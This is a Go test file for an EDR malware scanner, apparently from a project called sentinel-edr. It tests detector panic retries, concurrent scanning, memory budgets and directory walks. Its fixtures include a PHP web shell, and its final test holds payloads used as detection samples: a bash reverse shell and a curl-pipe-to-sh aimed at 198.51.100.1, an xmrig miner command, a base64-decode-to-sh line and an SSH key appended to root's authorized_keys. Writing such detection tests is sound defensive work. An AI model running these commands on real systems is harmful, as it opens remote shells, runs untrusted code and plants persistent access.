package scanner

import (
	"bytes"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/1ungaka/sentinel-edr/scanner/fusion"
)

func panicFixture(t *testing.T) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "sample")
	if err := os.WriteFile(p, []byte("<?php system($_GET['c']); ?>\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func allDetectors() *Engine {
	return &Engine{Heuristics: true, Static: true, Stego: true, EncChain: true, LNK: true, OLE: true, PDF: true,
		ISO: true, LinuxPkg: true, Peel: true, Archive: true, CHM: true, Tradecraft: true}
}

func TestDetectorPanicIsRetriedAndReported(t *testing.T) {
	e := allDetectors()
	var calls atomic.Int32
	e.beforeDetector = func(name string) {
		if name == "tradecraft" && calls.Add(1) == 1 {
			panic("transient")
		}
	}
	res, _ := e.ScanFile(panicFixture(t))
	if calls.Load() != 2 {
		t.Fatalf("ran %d times", calls.Load())
	}
	want := []DetectorPanic{{Detector: "tradecraft", Value: "transient", Attempts: 2, Recovered: true}}
	if !reflect.DeepEqual(res.Panics, want) {
		t.Fatalf("got %+v", res.Panics)
	}
	if res.Tradecraft == nil {
		t.Fatal("the retry's result must be kept")
	}
	if res.Verdict == VerdictError {
		t.Fatal("a detector that recovered must not leave the file unscannable")
	}
	if !strings.Contains(strings.Join(res.Warnings, "\n"), "completed on retry") {
		t.Fatalf("reports would not show it: %v", res.Warnings)
	}
}

// The retry is bounded and a panic stays one detector's problem: every other
// opinion survives, which the old in-sequence scan could not promise.
func TestDetectorThatKeepsPanickingCostsOnlyItsOwnOpinion(t *testing.T) {
	e := allDetectors()
	var calls atomic.Int32
	e.beforeDetector = func(name string) {
		if name == "heuristics" {
			calls.Add(1)
			panic("deterministic")
		}
	}
	res, h := e.ScanFile(panicFixture(t))
	if calls.Load() != detectorAttempts {
		t.Fatalf("ran %d times, want %d", calls.Load(), detectorAttempts)
	}
	want := []DetectorPanic{{Detector: "heuristics", Value: "deterministic", Attempts: detectorAttempts}}
	if !reflect.DeepEqual(res.Panics, want) {
		t.Fatalf("got %+v", res.Panics)
	}
	if h != nil {
		t.Fatal("the failed detector has no result")
	}
	if res.Static == nil || res.Tradecraft == nil || res.Peel == nil {
		t.Fatal("the other detectors' results must survive")
	}
	if res.Fusion == nil {
		t.Fatal("fusion must still weigh what the others found")
	}
}

func TestPanicOnACleanFileIsNotSilentlyClean(t *testing.T) {
	e := &Engine{Static: true}
	e.beforeDetector = func(string) { panic("always") }
	p := filepath.Join(t.TempDir(), "plain")
	if err := os.WriteFile(p, []byte("hello\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	res, _ := e.ScanFile(p)
	if res.Verdict != VerdictError || res.Error == nil {
		t.Fatalf("verdict %v, err %v", res.Verdict, res.Error)
	}
}

func TestSeveralDetectorsCanPanicTogether(t *testing.T) {
	e := allDetectors()
	e.beforeDetector = func(name string) {
		if name == "pdf" || name == "ole" || name == "iso" {
			panic(name)
		}
	}
	res, _ := e.ScanFile(panicFixture(t))
	var got []string
	for _, p := range res.Panics {
		got = append(got, p.Detector)
	}
	if !reflect.DeepEqual(got, []string{"iso", "ole", "pdf"}) {
		t.Fatalf("got %v: the report order must not depend on who finished first", got)
	}
}

// Running detectors at once must change nothing about what they conclude.
func TestConcurrentScanIsDeterministic(t *testing.T) {
	e := allDetectors()
	p := panicFixture(t)
	first, _ := e.ScanFile(p)
	for range 50 {
		res, _ := e.ScanFile(p)
		first.ScanTime, res.ScanTime = 0, 0
		if !reflect.DeepEqual(first, res) {
			t.Fatalf("results differ between runs:\n%+v\n%+v", first, res)
		}
	}
}

func BenchmarkScanFile(b *testing.B) {
	script := filepath.Join(b.TempDir(), "s.php")
	if err := os.WriteFile(script, []byte("<?php system($_GET['c']); ?>\n"), 0o644); err != nil {
		b.Fatal(err)
	}
	e := allDetectors()
	for _, c := range []struct{ name, path string }{{"script", script}, {"elf", "/usr/bin/bash"}, {"large", "/usr/bin/gcc"}} {
		if _, err := os.Stat(c.path); err != nil {
			continue
		}
		b.Run(c.name, func(b *testing.B) {
			for b.Loop() {
				e.ScanFile(c.path)
			}
		})
	}
}

// A burst of large files waits, and nothing is lost by it.
func TestBudgetBoundsWhatIsHeldAndNeverDeadlocks(t *testing.T) {
	b := newBudget(100)
	var held, peak atomic.Int64
	var wg sync.WaitGroup
	for i := range 64 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			n := int64(10 + i%60)
			release := b.acquire(n)
			h := held.Add(n)
			for {
				p := peak.Load()
				if h <= p || peak.CompareAndSwap(p, h) {
					break
				}
			}
			time.Sleep(200 * time.Microsecond)
			held.Add(-n)
			release()
		}()
	}
	wg.Wait()
	if peak.Load() > 100 {
		t.Fatalf("held %d of a 100 byte budget", peak.Load())
	}
}

// Asking for more than the whole budget must run, alone, rather than wait for ever.
func TestRequestOverTheBudgetStillRuns(t *testing.T) {
	b := newBudget(10)
	done := make(chan struct{})
	go func() {
		b.acquire(1000)()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("a file larger than the budget would never be scanned")
	}
}

// The streaming walk must keep the old contract: walk order, every file once.
func TestScanDirectoryKeepsWalkOrderAndCoversEverything(t *testing.T) {
	root := t.TempDir()
	want := []string{}
	for _, name := range []string{"a/1", "a/2", "b/4", "b/c/3", "z"} {
		p := filepath.Join(root, name)
		_ = os.MkdirAll(filepath.Dir(p), 0o755)
		_ = os.WriteFile(p, []byte(name), 0o644)
		want = append(want, p)
	}
	e := &Engine{Jobs: 4}
	last := 0
	res, _ := e.ScanDirectory(root, func(done, total int, _ string) {
		if total < done {
			t.Errorf("total %d is behind done %d", total, done)
		}
		last = done
	})
	var got []string
	for _, r := range res {
		got = append(got, r.FilePath)
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %v", got)
	}
	if last != len(want) {
		t.Fatalf("progress ended at %d", last)
	}
}

// Hashing in chunks on three goroutines must give the digests hashing whole does.
func TestStreamingHashMatchesInMemoryHash(t *testing.T) {
	data := bytes.Repeat([]byte("0123456789abcdef"), 1<<18) // 4 MiB, several chunks
	whole := hashBytes(data)
	streamed, err := hashReader(bytes.NewReader(data))
	if err != nil {
		t.Fatal(err)
	}
	if whole != streamed {
		t.Fatalf("%+v != %+v", whole, streamed)
	}
	if small := hashBytes([]byte("x")); small == (digests{}) {
		t.Fatal("the small-file path must hash too")
	}
}

// A binary carrying its payload as a string. Nothing else in the engine reads it:
// tradecraft treats the file as binary. This path looks like wasted work, and the
// scan of ordinary binaries that would pay for removing it is exactly what the
// prefilter made cheap, so it stays.
func TestELFCarryingScriptStaysFlagged(t *testing.T) {
	real, err := os.ReadFile("/usr/bin/true")
	if err != nil {
		t.Skip(err)
	}
	for name, payload := range map[string]string{
		"reverse-shell": "\nexport PATH=/tmp\nbash -i >& /dev/tcp/198.51.100.1/443 0>&1\n",
		"curl-pipe":     "\nexport X=1\ncurl -s http://198.51.100.1/x | sh\n",
		"miner":         "\nalias x=y\nxmrig --donate-level 1 -o stratum+tcp://pool.example:3333\n",
		"decode-exec":   "\nsource /tmp/x\necho aGk= | base64 -d | sh\n",
		"ssh-key":       "\nPATH=/x\necho 'ssh-rsa AAAA' >> /root/.ssh/authorized_keys\n",
	} {
		path := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(path, append(append([]byte{}, real...), payload...), 0o755); err != nil {
			t.Fatal(err)
		}
		r, _ := allDetectors().ScanFile(path)
		if r.LinuxPkg == nil || len(r.LinuxPkg.Findings) == 0 {
			t.Errorf("%s: the payload was not found", name)
		}
		if r.Fusion == nil || r.Fusion.Tier != fusion.TierSuspicious && r.Fusion.Tier != fusion.TierMalicious {
			t.Errorf("%s: not flagged: %+v", name, r.Fusion)
		}
	}
}
